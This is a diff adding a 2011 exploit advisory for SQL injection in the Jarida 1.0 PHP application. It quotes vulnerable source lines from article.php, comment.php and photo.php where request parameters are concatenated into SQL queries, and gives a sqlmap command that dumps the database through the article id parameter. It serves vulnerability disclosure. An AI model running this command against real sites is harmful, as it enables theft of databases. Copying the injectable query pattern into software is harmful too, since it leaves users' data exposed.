@@ -1,0 +1,46 @@
+# Exploit Title:   Jarida 1.0 SQL Injection
+# Date         :   26 September 2011
+# Author       :   Ptrace Security (Gianni Gnesa [gnix])
+# Contact      :   research[at]ptrace-security[dot]com
+# Software Link:   http://sourceforge.net/projects/jarida/
+# Version      :   1.0
+# Tested on    :   CentOS 5.6
+ 
+ 
+[01] ./article.php:28:  $query = "SELECT article_id FROM tblArticle WHERE article_id = " . $_GET['id'];
+     => ./sqlmap.py -u http://192.168.109.111/jarida_1.0/article.php?id=1 --dump --tables
+
+
+[02] ./comment.php
+
+     36 $name = $_POST['name'];
+     37 $web = $_POST['web'];
+     38 $title = $_POST['title'];
+     39 $body = $_POST['body'];
+     40 $ip = $_SERVER['REMOTE_ADDR'];
+     41 $article_id = $_POST['id'];
+     42 $date = time();
+     43 
+     ...
+     56 
+     57 switch($_POST['type'])
+     58 {
+     59  case 'article':
+     60    $redirect_url = "./article.php?id=" . $_POST['id'];
+     61    $query = "INSERT INTO tblArticleComment (comment_article_id, comment_title, comment_date, comment_body, comment_name, comment_web, comment_ip)
+     62                 VALUES('$article_id', '$title', '$date', '$body', '$name', '$web', '$ip')";
+     63    break;
+     64 
+     65  case 'photo':
+     66    $redirect_url = "./photo.php?id=" . $_POST['id'];
+     67    $query = "INSERT INTO tblPhotoComment (comment_photo_id, comment_title, comment_date, comment_body, comment_name, comment_web, comment_ip)
+     68                 VALUES('$article_id', '$title', '$date', '$body', '$name', '$web', '$ip')";
+     69    break;
+     70 }
+
+
+[03] ./photo.php
+
+     39   $query = "SELECT photo_id FROM tblPhoto
+     40                  WHERE photo_id = " . $_GET['id'];
+
